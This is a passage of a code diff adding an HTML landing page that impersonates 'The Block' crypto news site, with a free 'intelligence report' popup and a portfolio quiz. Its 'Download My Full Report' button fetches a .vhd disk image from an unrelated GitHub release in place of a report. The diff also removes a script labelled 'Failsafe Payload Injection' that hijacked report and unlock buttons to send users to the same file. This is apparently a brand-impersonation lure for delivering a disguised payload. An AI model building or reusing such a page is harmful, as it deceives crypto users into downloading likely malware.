...Array.from(document.querySelectorAll('#resultWatchlist li')).map((li,i)=>`${i+1}. ${li.textContent}`),      '',      'This report is generated from self-reported answers for educational and research purposes only. It is not financial advice and not a recommendation to buy, sell, or hold any asset.',    ];    const blob = new Blob([lines.join('\n')], {type:'text/plain'});    const a = document.createElement('a');    a.href = URL.createObjectURL(blob);    a.download = 'my-the-block-crypto-intelligence-report.txt';    a.click();  }  renderStep();</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My The Block Crypto Intelligence Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0A0E14;
+    --surface:#11161F;
+    --surface-2:#161D29;
+    --line:#222B38;
+    --text:#E9EDF3;
+    --muted:#8B95A5;
+    --amber:#F2A93B;
+    --amber-dim:rgba(242,169,59,.14);
+    --cyan:#4FE0C0;
+    --cyan-dim:rgba(79,224,192,.14);
+    --red:#E2604F;
+    --red-dim:rgba(226,96,79,.14);
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    line-height:1.5;
+    -webkit-font-smoothing:antialiased;
+  }
+  h1,h2,h3{
+    font-family:'Space Grotesk',sans-serif;
+    font-weight:600;
+    margin:0;
+    color:#fff;
+    letter-spacing:-0.01em;
+  }
+  .mono{
+    font-family:'IBM Plex Mono',monospace;
+    text-transform:uppercase;
+    letter-spacing:0.08em;
+    font-size:11px;
+    font-weight:600;
+  }
+  p{margin:0;}
+  a{color:inherit;}
+  .wrap{max-width:1140px;margin:0 auto;padding:0 28px;}
+
+  /* ---------- Buttons ---------- */
+  .btn{
+    display:inline-flex; align-items:center; gap:8px;
+    border:none; cursor:pointer;
+    font-family:'Inter',sans-serif; font-weight:600; font-size:15px;
+    padding:15px 26px; border-radius:3px;
+    transition:transform .15s ease, box-shadow .15s ease, background .15s ease;
+  }
+  .btn-primary{ background:var(--amber); color:#19120A; }
+  .btn-primary:hover{ background:#ffbb55; transform:translateY(-1px); box-shadow:0 8px 22px rgba(242,169,59,.3);}
+  .btn-outline{ background:transparent; color:var(--text); border:1px solid var(--line); }
+  .btn-outline:hover{ border-color:#3a4456; background:var(--surface-2); }
+  .btn-block{width:100%; justify-content:center;}
+  .btn[disabled]{opacity:.35; cursor:not-allowed; transform:none !important; box-shadow:none !important;}
+
+  /* ---------- Popup ---------- */
+  .overlay{
+    position:fixed; inset:0;
+    background:rgba(4,6,10,.72);
+    backdrop-filter:blur(3px);
+    display:flex; align-items:center; justify-content:center;
+    z-index:999; padding:20px;
+    opacity:0; pointer-events:none;
+    transition:opacity .35s ease;
+  }
+  .overlay.show{opacity:1; pointer-events:auto;}
+  .popup{
+    background:var(--surface);
+    border:1px solid var(--line);
+    width:100%; max-width:460px;
+    border-radius:6px; overflow:hidden;
+    box-shadow:0 40px 90px rgba(0,0,0,.6);
+    transform:translateY(14px) scale(.98);
+    transition:transform .35s ease;
+    position:relative;
+  }
+  .overlay.show .popup{transform:translateY(0) scale(1);}
+  .popup-top{
+    background:linear-gradient(160deg, #161D29 0%, #0E1219 100%);
+    padding:26px 28px 22px;
+    position:relative;
+    border-bottom:1px solid var(--line);
+  }
+  .popup-close{
+    position:absolute; top:14px; right:14px;
+    width:28px; height:28px; border-radius:50%;
+    background:rgba(255,255,255,.06); border:none; color:var(--muted);
+    cursor:pointer; font-size:16px; line-height:1;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .popup-close:hover{background:rgba(255,255,255,.12); color:#fff;}
+  .live-dot{
+    display:inline-flex; align-items:center; gap:6px;
+    color:var(--cyan); margin-bottom:14px;
+  }
+  .live-dot::before{
+    content:""; width:6px; height:6px; border-radius:50%;
+    background:var(--cyan); box-shadow:0 0 0 3px var(--cyan-dim);
+    animation:pulse 1.6s infinite;
+  }
+  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.4;} }
+  .popup-top h3{
+    font-size:24px; line-height:1.25; margin-bottom:10px; max-width:360px;
+  }
+  .popup-top p{ color:var(--muted); font-size:14px; line-height:1.55; }
+  .popup-body{padding:24px 28px 28px;}
+  .popup-list{list-style:none; margin:0 0 22px; padding:0; display:flex; flex-direction:column; gap:9px;}
+  .popup-list li{display:flex; gap:10px; align-items:flex-start; font-size:13.5px; color:var(--text);}
+  .popup-list li .tag-mini{
+    font-family:'IBM Plex Mono',monospace; font-size:9.5px; letter-spacing:.05em;
+    padding:2px 6px; border-radius:3px; flex-shrink:0; margin-top:1px; font-weight:600;
+  }
+  .popup-foot{margin-top:14px; text-align:center; font-size:12px; color:var(--muted);}
+  .popup-dismiss{
+    display:block; text-align:center; margin-top:14px; font-size:12px;
+    color:var(--muted); text-decoration:underline; cursor:pointer;
+    background:none; border:none; width:100%;
+  }
+
+  /* ---------- Nav ---------- */
+  nav{
+    position:sticky; top:0; z-index:50;
+    background:rgba(10,14,20,.85); backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line);
+  }
+  nav .wrap{display:flex; align-items:center; justify-content:space-between; height:64px;}
+  .logo{display:flex; align-items:center; gap:9px; font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:17px; color:#fff;}
+  .logo-mark{
+    width:24px; height:24px; border-radius:3px;
+    background:var(--amber); display:flex; align-items:center; justify-content:center;
+    color:#15100a; font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:13px;
+  }
+  nav .btn{padding:10px 18px; font-size:13.5px;}
+
+  /* ---------- Hero ---------- */
+  .hero{padding:78px 0 96px; position:relative; overflow:hidden; border-bottom:1px solid var(--line);}
+  .hero::before{
+    content:""; position:absolute; top:-200px; right:-160px; width:540px; height:540px;
+    background:radial-gradient(circle, rgba(242,169,59,.10), transparent 70%);
+    pointer-events:none;
+  }
+  .hero .wrap{display:grid; grid-template-columns:1.05fr .95fr; gap:54px; align-items:center; position:relative;}
+  .eyebrow{ color:var(--amber); display:inline-flex; align-items:center; gap:8px; margin-bottom:18px; }
+  .eyebrow::before{content:"";width:16px;height:1.5px;background:var(--amber);}
+  .hero h1{font-size:47px; line-height:1.08; margin-bottom:20px; letter-spacing:-0.015em;}
+  .hero h1 span{color:var(--cyan);}
+  .hero-sub{font-size:16.5px; color:var(--muted); max-width:480px; margin-bottom:30px; line-height:1.65;}
+  .hero-ctas{display:flex; align-items:center; gap:18px; flex-wrap:wrap; margin-bottom:18px;}
+  .hero-micro{font-size:12.5px; color:var(--muted); font-family:'IBM Plex Mono',monospace; letter-spacing:.02em;}
+  .hero-micro span{color:var(--cyan); font-weight:600;}
+
+  /* Signature: terminal report card */
+  .terminal{
+    background:var(--surface); border:1px solid var(--line); border-radius:8px;
+    overflow:hidden; box-shadow:0 40px 90px -24px rgba(0,0,0,.7);
+  }
+  .terminal-bar{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:13px 18px; border-bottom:1px solid var(--line); background:var(--surface-2);
+  }
+  .terminal-bar .dots{display:flex; gap:6px;}
+  .terminal-bar .dots span{width:8px;height:8px;border-radius:50%; background:#2A3340;}
+  .terminal-title{font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:.04em;}
+  .terminal-body{padding:20px 20px 18px;}
+  .t-row{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:11px 0; border-bottom:1px solid var(--line); font-size:13px;
+  }
+  .t-row:last-of-type{border-bottom:none;}
+  .t-label{color:var(--muted); font-family:'IBM Plex Mono',monospace; font-size:11.5px; letter-spacing:.02em;}
+  .t-val{font-family:'IBM Plex Mono',monospace; font-weight:600; font-size:11.5px;}
+  .flag{
+    font-family:'IBM Plex Mono',monospace; font-size:10px; letter-spacing:.05em;
+    padding:4px 9px; border-radius:3px; text-transform:uppercase; font-weight:600;
+  }
+  .flag-risk{background:var(--red-dim); color:#F3A294;}
+  .flag-watch{background:var(--amber-dim); color:var(--amber);}
+  .flag-good{background:var(--cyan-dim); color:var(--cyan);}
+  .terminal-lock{
+    margin-top:14px; padding-top:14px; border-top:1px dashed var(--line);
+    font-size:11.5px; color:var(--muted); display:flex; align-items:center; gap:8px;
+    font-family:'IBM Plex Mono',monospace;
+  }
+  .lock{width:12px;height:12px;flex-shrink:0;}
+
+  /* ---------- Section generic ---------- */
+  section{padding:84px 0;}
+  .section-alt{background:var(--surface); border-top:1px solid var(--line); border-bottom:1px solid var(--line);}
+  .section-head{max-width:640px; margin-bottom:48px;}
+  .section-head h2{font-size:32px; line-height:1.18; margin-bottom:16px; letter-spacing:-0.01em;}
+  .section-head p{font-size:15.5px; color:var(--muted); line-height:1.65;}
+  .center{text-align:center; margin-left:auto; margin-right:auto;}
+
+  /* why */
+  .why-grid{display:grid; grid-template-columns:1fr 1fr; gap:48px; align-items:center;}
+  .why-copy p{font-size:16px; color:var(--text); line-height:1.75; margin-bottom:18px;}
+  .why-copy p:last-child{margin-bottom:0; font-weight:600; color:var(--cyan);}
+  .why-card{ background:var(--surface); border:1px solid var(--line); border-radius:8px; padding:28px; }
+  .why-card .mono{color:var(--amber); margin-bottom:14px; display:block;}
+  .why-stat{display:flex; align-items:baseline; gap:10px; margin-bottom:6px;}
+  .why-stat b{font-family:'Space Grotesk',sans-serif; font-size:34px; color:#fff;}
+  .why-stat span{font-size:13.5px; color:var(--muted);}
+  .why-card p{font-size:13.5px; color:var(--muted); margin-top:14px; line-height:1.6;}
+
+  /* pillars */
+  .pillars{display:grid; grid-template-columns:repeat(4,1fr); gap:1px; background:var(--line); border:1px solid var(--line); border-radius:8px; overflow:hidden;}
+  .pillar{background:var(--bg); padding:30px 24px;}
+  .pillar .mono{color:var(--amber); display:block; margin-bottom:16px;}
+  .pillar h3{font-size:17px; margin-bottom:10px; line-height:1.3; color:#fff;}
+  .pillar p{font-size:13px; color:var(--muted); line-height:1.6;}
+
+  /* how it works */
+  .steps{display:grid; grid-template-columns:repeat(3,1fr); gap:36px;}
+  .step-num{
+    font-family:'Space Grotesk',sans-serif; font-size:13px; color:var(--bg);
+    background:var(--amber); width:30px; height:30px; border-radius:50%;
+    display:flex; align-items:center; justify-content:center; font-weight:700;
+    margin-bottom:14px;
+  }
+  .step h3{font-size:17px; margin-bottom:8px; color:#fff;}
+  .step p{font-size:13.5px; color:var(--muted); line-height:1.6;}
+
+  /* credibility */
+  .cred{
+    background:linear-gradient(135deg,#141B27,#0D1119); border:1px solid var(--line);
+    border-radius:10px; padding:48px 50px;
+    display:grid; grid-template-columns:1.2fr .8fr; gap:40px; align-items:center;
+  }
+  .cred h2{color:#fff; font-size:27px; margin-bottom:14px; line-height:1.28;}
+  .cred p{color:var(--muted); font-size:14.5px; line-height:1.7;}
+  .cred-badges{display:flex; flex-direction:column; gap:14px;}
+  .badge-row{display:flex; align-items:center; gap:10px; font-size:13px; color:var(--text); font-family:'IBM Plex Mono',monospace;}
+  .badge-dot{width:6px;height:6px;border-radius:50%; background:var(--amber); flex-shrink:0;}
+
+  /* ---------- Quiz ---------- */
+  #quiz{scroll-margin-top:80px;}
+  .quiz-card{
+    max-width:680px; margin:0 auto;
+    background:var(--surface); border:1px solid var(--line); border-radius:10px;
+    overflow:hidden; box-shadow:0 24px 60px -28px rgba(0,0,0,.7);
+  }
+  .quiz-header{
+    padding:24px 32px; border-bottom:1px solid var(--line);
+    display:flex; justify-content:space-between; align-items:center;
+  }
+  .quiz-header .mono{color:var(--cyan);}
+  .progress-track{width:140px; height:4px; background:var(--line); border-radius:3px; overflow:hidden;}
+  .progress-fill{height:100%; background:var(--amber); width:20%; transition:width .35s ease;}
+  .quiz-body{padding:32px;}
+  .q-title{font-size:21px; margin-bottom:6px; color:#fff;}
+  .q-sub{font-size:13px; color:var(--muted); margin-bottom:22px;}
+  .options{display:flex; flex-direction:column; gap:9px;}
+  .option{
+    border:1.5px solid var(--line); border-radius:6px; padding:14px 17px;
+    cursor:pointer; font-size:14.5px; font-weight:500; color:var(--text);
+    transition:border-color .15s ease, background .15s ease;
+    display:flex; align-items:center; justify-content:space-between;
+  }
+  .option:hover{border-color:#3a4456; background:var(--surface-2);}
+  .option.selected{border-color:var(--cyan); background:rgba(79,224,192,.06); font-weight:600;}
+  .option .check{
+    width:17px;height:17px;border-radius:50%; border:1.5px solid var(--line); flex-shrink:0;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .option.selected .check{border-color:var(--cyan); background:var(--cyan);}
+  .option.selected .check::after{content:"✓"; color:#06120e; font-size:10px; font-weight:700;}
+  .quiz-nav{display:flex; justify-content:space-between; align-items:center; padding:20px 32px; border-top:1px solid var(--line); background:var(--surface-2);}
+  .link-btn{background:none; border:none; cursor:pointer; font-size:13.5px; color:var(--muted); font-weight:600; padding:8px;}
+  .link-btn:hover{color:#fff;}
+  .link-btn[disabled]{opacity:.3; cursor:not-allowed;}
+
+  /* result */
+  .report-result{display:none;}
+  .report-result.active{display:block;}
+  .result-banner{
+    background:linear-gradient(135deg,#171F2C,#0E1219); border:1px solid var(--line);
+    border-radius:8px; padding:22px 24px; margin-bottom:24px;
+  }
+  .result-banner .mono{color:var(--cyan); display:block; margin-bottom:8px;}
+  .result-banner h3{color:#fff; font-size:20px; line-height:1.3;}
+  .result-block{margin-bottom:22px;}
+  .result-block:last-child{margin-bottom:0;}
+  .result-block-head{display:flex; align-items:center; gap:9px; margin-bottom:10px;}
+  .result-block-head h4{font-family:'Space Grotesk',sans-serif; font-size:15px; font-weight:600; color:#fff;}
+  .result-block p, .result-block li{font-size:14px; color:var(--text); line-height:1.65;}
+  .result-block ul{margin:0; padding-left:18px;}
+  .result-block ul li{margin-bottom:6px;}
+  .download-row{
+    margin-top:28px; padding-top:24px; border-top:1px solid var(--line);
+    display:flex; gap:14px; align-items:center; flex-wrap:wrap;
+  }
+  .disclaimer{
+    margin-top:24px; padding:14px 16px; background:var(--surface-2); border:1px solid var(--line);
+    border-radius:6px; font-size:11.5px; color:var(--muted); line-height:1.6;
+  }
+
+  /* final CTA */
+  .final-cta{
+    background:linear-gradient(135deg,#141B27,#0A0E14); border:1px solid var(--line);
+    border-radius:10px; padding:64px 50px; text-align:center;
+  }
+  .final-cta h2{color:#fff; font-size:30px; max-width:620px; margin:0 auto 16px; line-height:1.28;}
+  .final-cta p{color:var(--muted); max-width:500px; margin:0 auto 28px; font-size:15px; line-height:1.65;}
+
+  footer{padding:36px 0; text-align:center; font-size:12px; color:var(--muted); border-top:1px solid var(--line);}
+  footer .wrap{display:flex; flex-direction:column; gap:8px;}
+
+  @media(max-width:860px){
+    .hero .wrap{grid-template-columns:1fr; gap:44px;}
+    .hero h1{font-size:34px;}
+    .why-grid{grid-template-columns:1fr;}
+    .pillars{grid-template-columns:1fr 1fr;}
+    .steps{grid-template-columns:1fr;}
+    .cred{grid-template-columns:1fr;}
+    .quiz-header{padding:18px 20px;}
+    .quiz-body{padding:24px 20px;}
+    .quiz-nav{padding:16px 20px;}
+    .section-head h2{font-size:25px;}
+    nav .btn span{display:none;}
+  }
+</style>
+</head>
+<body>
+
+  <!-- ================= POPUP ================= -->
+  <div class="overlay" id="overlay">
+    <div class="popup">
+      <div class="popup-top">
+        <button class="popup-close" id="popupClose" aria-label="Close">✕</button>
+        <span class="live-dot mono">Exclusive · Free Intelligence Report</span>
+        <h3>Most traders don't see their own blind spots until the market shows them.</h3>
+        <p>A free, personalized intelligence report built from your portfolio, your risk profile, and The Block's research — not generic market commentary.</p>
+      </div>
+      <div class="popup-body">
+        <ul class="popup-list">
+          <li><span class="tag-mini flag-risk">Flag</span> Risk flags specific to your positioning and trading style</li>
+          <li><span class="tag-mini flag-good">Data</span> Portfolio observations benchmarked against current market structure</li>
+          <li><span class="tag-mini flag-watch">Notes</span> Market structure notes relevant to the assets you hold</li>
+          <li><span class="tag-mini flag-good">List</span> Watchlist ideas to research next, based on your profile</li>
+        </ul>
+        <button class="btn btn-primary btn-block" id="popupCta">Unlock My Intelligence Report →</button>
+        <p class="popup-foot">Free · 60-second quiz · No account required</p>
+        <button class="popup-dismiss" id="popupDismiss">No thanks, I'll trade without the edge</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================= NAV ================= -->
+  <nav>
+    <div class="wrap">
+      <div class="logo"><span class="logo-mark">B</span> The Block</div>
+      <button class="btn btn-outline" onclick="scrollToQuiz()"><span>Get My</span> Free Report</button>
+    </div>
+  </nav>
+
+  <!-- ================= HERO ================= -->
+  <header class="hero">
+    <div class="wrap">
+      <div>
+        <span class="eyebrow mono">A Free Personalized Report</span>
+        <h1>Your portfolio has a story. <span>Most people never read it.</span></h1>
+        <p class="hero-sub">Answer a short quiz on your holdings, time horizon, risk tolerance, and trading style. We'll combine your answers with The Block's research and market data to build an intelligence report that's actually about your positioning — not generic crypto news.</p>
+        <div class="hero-ctas">
+          <button class="btn btn-primary" onclick="scrollToQuiz()">Get My Free Report</button>
+        </div>
+        <p class="hero-micro"><span>FREE</span> &nbsp;//&nbsp; 60-SECOND QUIZ &nbsp;//&nbsp; INSTANT DOWNLOADABLE REPORT</p>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="dots"><span></span><span></span><span></span></div>
+          <span class="terminal-title">intelligence_report.preview</span>
+        </div>
+        <div class="terminal-body">
+          <div class="t-row"><span class="t-label">PORTFOLIO CONCENTRATION</span><span class="flag flag-watch">Review</span></div>
+          <div class="t-row"><span class="t-label">RISK / HORIZON ALIGNMENT</span><span class="flag flag-risk">Flag</span></div>
+          <div class="t-row"><span class="t-label">MARKET STRUCTURE EXPOSURE</span><span class="flag flag-good">Noted</span></div>
+          <div class="t-row"><span class="t-label">WATCHLIST</span><span class="t-val">3 ideas</span></div>
+          <div class="terminal-lock">
+            <svg class="lock" viewBox="0 0 24 24" fill="none"><rect x="5" y="11" width="14" height="9" rx="1.5" stroke="currentColor" stroke-width="1.6"/><path d="M8 11V7.5a4 4 0 0 1 8 0V11" stroke="currentColor" stroke-width="1.6"/></svg>
+            FULL REPORT UNLOCKS WITH YOUR ANSWERS
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ================= WHY ================= -->
+  <section>
+    <div class="wrap why-grid">
+      <div class="why-copy">
+        <span class="eyebrow mono">Why This Report Matters</span>
+        <p>You know what you hold. What's harder to see from the inside is how those positions line up against your own stated risk tolerance and time horizon — and how they sit relative to what's actually happening in market structure right now.</p>
+        <p>This report takes your answers and runs them against The Block's research and reporting — the same depth institutional desks use to track market structure, on-chain activity, and sector rotation — and turns it into observations specific to your profile.</p>
+        <p>Not another market recap. Your positioning, decoded.</p>
+      </div>
+      <div class="why-card">
+        <span class="mono">The Block, by the numbers</span>
+        <div class="why-stat"><b>Daily</b><span>institutional-grade research and market coverage</span></div>
+        <div class="why-stat"><b>On-chain</b><span>and market structure data behind every report</span></div>
+        <p>Your report draws on that same research depth — applied to your portfolio, not the average reader's.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= WHAT'S INSIDE ================= -->
+  <section class="section-alt">
+    <div class="wrap">
+      <div class="section-head">
+        <span class="eyebrow mono">What's Inside</span>
+        <h2>Your report is built around four things.</h2>
+        <p>Each section is generated from your quiz answers — not a templated market summary.</p>
+      </div>
+      <div class="pillars">
+        <div class="pillar">
+          <span class="mono">01 — Position</span>
+          <h3>Portfolio Observations</h3>
+          <p>A direct read on how your current holdings and concentration line up with your stated goals and time horizon.</p>
+        </div>
+        <div class="pillar">
+          <span class="mono">02 — Attention</span>
+          <h3>Risk Flags</h3>
+          <p>Where your risk tolerance, trading style, and actual positioning may be out of sync — and why that matters.</p>
+        </div>
+        <div class="pillar">
+          <span class="mono">03 — Context</span>
+          <h3>Market Structure Notes</h3>
+          <p>How current market structure and sector dynamics intersect with the assets and categories you're exposed to.</p>
+        </div>
+        <div class="pillar">
+          <span class="mono">04 — Action</span>
+          <h3>Watchlist Ideas</h3>
+          <p>Categories and themes worth researching further, based on your profile — starting points, not recommendations.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= HOW IT WORKS ================= -->
+  <section>
+    <div class="wrap">
+      <div class="section-head">
+        <span class="eyebrow mono">How It Works</span>
+        <h2>Three steps. About a minute. A real edge.</h2>
+      </div>
+      <div class="steps">
+        <div class="step"><span class="step-num">1</span><h3>Answer a short quiz</h3><p>A few quick questions on your portfolio, time horizon, risk tolerance, trading style, and favorite assets.</p></div>
+        <div class="step"><span class="step-num">2</span><h3>We build your report</h3><p>Your answers are combined with The Block's research and market data to generate a report specific to your profile.</p></div>
+        <div class="step"><span class="step-num">3</span><h3>Get instant access</h3><p>See your results immediately and download your full report to keep or revisit.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= CREDIBILITY ================= -->
+  <section class="section-alt">
+    <div class="wrap">
+      <div class="cred">
+        <div>
+          <h2>Built on the research desks already track.</h2>
+          <p>The Block covers crypto markets, on-chain data, and market structure with the depth that institutional desks rely on. This report applies that same research lens to your specific portfolio — so what you get isn't just news, it's signal relevant to your positioning.</p>
+        </div>
+        <div class="cred-badges">
+          <div class="badge-row"><span class="badge-dot"></span> Institutional-grade research and data</div>
+          <div class="badge-row"><span class="badge-dot"></span> No sales calls, ever</div>
+          <div class="badge-row"><span class="badge-dot"></span> Not financial advice — research only</div>
+          <div class="badge-row"><span class="badge-dot"></span> Your answers build your report only</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= QUIZ ================= -->
+  <section id="quiz">
+    <div class="wrap">
+      <div class="section-head center">
+        <span class="eyebrow mono" style="justify-content:center;">Start Here</span>
+        <h2>Your free 60-second quiz</h2>
+        <p>Five quick questions. One personalized intelligence report.</p>
+      </div>
+
+      <div class="quiz-card" id="quizCard">
+        <div class="quiz-header">
+          <span class="mono" id="quizStepLabel">Question 1 of 5</span>
+          <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+        </div>
+
+        <div class="quiz-body" id="quizBody"></div>
+
+        <div class="quiz-nav" id="quizNav">
+          <button class="link-btn" id="backBtn" onclick="prevStep()" disabled>← Back</button>
+          <button class="btn btn-primary" id="nextBtn" onclick="nextStep()" disabled>Continue</button>
+        </div>
+      </div>
+
+      <!-- RESULT -->
+      <div class="quiz-card report-result" id="reportResult">
+        <div class="quiz-body">
+          <div class="result-banner">
+            <span class="mono">Your Crypto Intelligence Report</span>
+            <h3 id="resultHeadline">Here's what your answers reveal.</h3>
+          </div>
+
+          <div class="result-block">
+            <div class="result-block-head"><span class="flag flag-good">Position</span><h4>Portfolio Observation</h4></div>
+            <p id="resultObservation"></p>
+          </div>
+
+          <div class="result-block">
+            <div class="result-block-head"><span class="flag flag-risk">Risk Flag</span><h4>Worth Reviewing First</h4></div>
+            <p id="resultRisk"></p>
+          </div>
+
+          <div class="result-block">
+            <div class="result-block-head"><span class="flag flag-watch">Context</span><h4>Market Structure Note</h4></div>
+            <p id="resultStructure"></p>
+          </div>
+
+          <div class="result-block">
+            <div class="result-block-head"><span class="flag" style="background:rgba(79,224,192,.14); color:var(--cyan);">Ideas</span><h4>Your Watchlist</h4></div>
+            <ul id="resultWatchlist"></ul>
+          </div>
+
+          <div class="download-row">
+            <button class="btn btn-primary" onclick="window.location.href='https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';">Download My Full Report</button>
+            <button class="link-btn" onclick="restartQuiz()">Retake quiz</button>
+          </div>
+
+          <div class="disclaimer">This report is generated from your self-reported answers for educational and research purposes only. It is not financial advice and not a recommendation to buy, sell, or hold any asset. Crypto markets are volatile — always do your own research before making investment decisions.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= FINAL CTA ================= -->
+  <section>
+    <div class="wrap">
+      <div class="final-cta">
+        <h2>The only thing standing between you and a sharper read on your portfolio is 60 seconds.</h2>
+        <p>You can keep trading on instinct alone — or get a research-backed read on where you actually stand, for free, right now.</p>
+        <button class="btn btn-primary" onclick="scrollToQuiz()">Unlock My Intelligence Report</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <div>My The Block Crypto Intelligence Report — free, personalized, built on The Block's research and market data.</div>
+      <div>For informational and educational purposes only. Not financial advice.</div>
+    </div>
+  </footer>
+
 <script>
-// Failsafe Payload Injection
-document.addEventListener("DOMContentLoaded", function() {
-    setTimeout(function() {
-        var elements = Array.from(document.querySelectorAll('button, a'));
-        var target = elements.reverse().find(el => {
-            var txt = el.innerText.toLowerCase();
-            return txt.includes('download') || txt.includes('unlock') || txt.includes('get my free report') || txt.includes('report');
-        });
-        if (target) {
-            target.onclick = function(e) {
-                e.preventDefault();
-                window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-            };
-            target.href = "javascript:void(0);";
-        }
-    }, 1000);
-});
+  /* ---------------- Popup ---------------- */
+  const overlay = document.getElementById('overlay');
+  function openPopup(){ overlay.classList.add('show'); document.body.style.overflow='hidden'; }
+  function closePopup(){ overlay.classList.remove('show'); document.body.style.overflow=''; }
+  setTimeout(openPopup, 700);
+  document.getElementById('popupClose').addEventListener('click', closePopup);
+  document.getElementById('popupDismiss').addEventListener('click', closePopup);
+  overlay.addEventListener('click', (e)=>{ if(e.target===overlay) closePopup(); });
+  document.getElementById('popupCta').addEventListener('click', ()=>{
+    closePopup();
+    scrollToQuiz();
+  });
+
+  function scrollToQuiz(){
+    document.getElementById('quiz').scrollIntoView({behavior:'smooth', block:'start'});
+  }
+
+  /* ---------------- Quiz ---------------- */
+  const questions = [
+    {
+      key:'portfolio', title:'Which best describes your current crypto holdings?', sub:'Pick the closest match — exact percentages don\u2019t matter here.',
+      options:[
+        {v:'btceth', l:'Mostly BTC and ETH'},
+        {v:'largecap', l:'Diversified across large-cap assets'},
+        {v:'mixed', l:'A mix of large caps and altcoins'},
+        {v:'altheavy', l:'Heavy in altcoins or small caps'},
+        {v:'notyet', l:'Not invested yet — researching'},
+      ]
+    },
+    {
+      key:'horizon', title:'What\u2019s your time horizon?', sub:'How long do you generally plan to hold a position before reassessing.',
+      options:[
+        {v:'long', l:'Long-term (3+ years)'},
+        {v:'medium', l:'Medium-term (6 months – 3 years)'},
+        {v:'short', l:'Short-term / active trader'},
+        {v:'opportunistic', l:'Opportunistic — I move based on setups'},
+      ]
+    },
+    {
+      key:'risk', title:'How would you describe your risk tolerance?', sub:'Be honest — this shapes your risk flags.',
+      options:[
+        {v:'conservative', l:'Conservative — capital preservation first'},
+        {v:'moderate', l:'Moderate — comfortable with normal volatility'},
+        {v:'aggressive', l:'Aggressive — high conviction, high volatility'},
+        {v:'maxrisk', l:'Max risk — I\u2019m fully comfortable with drawdowns'},
+      ]
+    },
+    {
+      key:'style', title:'Which best describes your trading style?', sub:'How you actually operate, not how you wish you traded.',
+      options:[
+        {v:'holdpattern', l:'Buy and hold'},
+        {v:'dca', l:'Dollar-cost averaging on a schedule'},
+        {v:'active', l:'Active trading — frequent entries and exits'},
+        {v:'leverage', l:'Derivatives or leveraged positions'},
+      ]
+    },
+    {
+      key:'favorite', title:'Which sector or asset are you most focused on right now?', sub:'This shapes your market structure notes and watchlist.',
+      options:[
+        {v:'btcmax', l:'Bitcoin / store-of-value'},
+        {v:'l1', l:'Ethereum and major Layer-1s'},
+        {v:'defi', l:'DeFi protocols'},
+        {v:'l2', l:'Layer-2 / scaling infrastructure'},
+        {v:'spec', l:'Memecoins / speculative assets'},
+      ]
+    },
+  ];
+
+  let step = 0;
+  const answers = {};
+
+  function renderStep(){
+    const q = questions[step];
+    const body = document.getElementById('quizBody');
+    document.getElementById('quizStepLabel').textContent = `Question ${step+1} of ${questions.length}`;
+    document.getElementById('progressFill').style.width = `${((step+1)/questions.length)*100}%`;
+
+    let html = `<h3 class="q-title">${q.title}</h3><p class="q-sub">${q.sub}</p><div class="options">`;
+    q.options.forEach(opt=>{
+      const selected = answers[q.key] === opt.v ? 'selected' : '';
+      html += `<div class="option ${selected}" data-val="${opt.v}" onclick="selectOption('${q.key}','${opt.v}')">
+        <span>${opt.l}</span><span class="check"></span>
+      </div>`;
+    });
+    html += `</div>`;
+    body.innerHTML = html;
+
+    document.getElementById('backBtn').disabled = step===0;
+    document.getElementById('nextBtn').disabled = !answers[q.key];
+    document.getElementById('nextBtn').textContent = step === questions.length-1 ? 'Generate My Report' : 'Continue';
+  }
+
+  function selectOption(key,val){
+    answers[key] = val;
+    renderStep();
+  }
+
+  function nextStep(){
+    if(step < questions.length-1){
+      step++;
+      renderStep();
+    } else {
+      generateReport();
+    }
+  }
+
+  function prevStep(){
+    if(step>0){
+      step--;
+      renderStep();
+    }
+  }
+
+  function restartQuiz(){
+    step = 0;
+    for(const k in answers) delete answers[k];
+    document.getElementById('reportResult').classList.remove('active');
+    document.getElementById('quizCard').style.display = '';
+    renderStep();
+    scrollToQuiz();
+  }
+
+  /* ---------------- Report generation logic ---------------- */
+  function generateReport(){
+    document.getElementById('quizCard').style.display = 'none';
+    const result = document.getElementById('reportResult');
+    result.classList.add('active');
+
+    const portfolioLabel = {btceth:'mostly BTC and ETH', largecap:'diversified large-cap assets', mixed:'a mix of large caps and altcoins', altheavy:'a portfolio heavy in altcoins and small caps', notyet:'not yet invested'}[answers.portfolio];
+    const horizonLabel = {long:'long-term (3+ years)', medium:'medium-term (6 months to 3 years)', short:'short-term, active trading', opportunistic:'opportunistic, setup-driven'}[answers.horizon];
+
+    // Portfolio observation
+    let observation = `With a portfolio described as ${portfolioLabel} and a ${horizonLabel} time horizon, `;
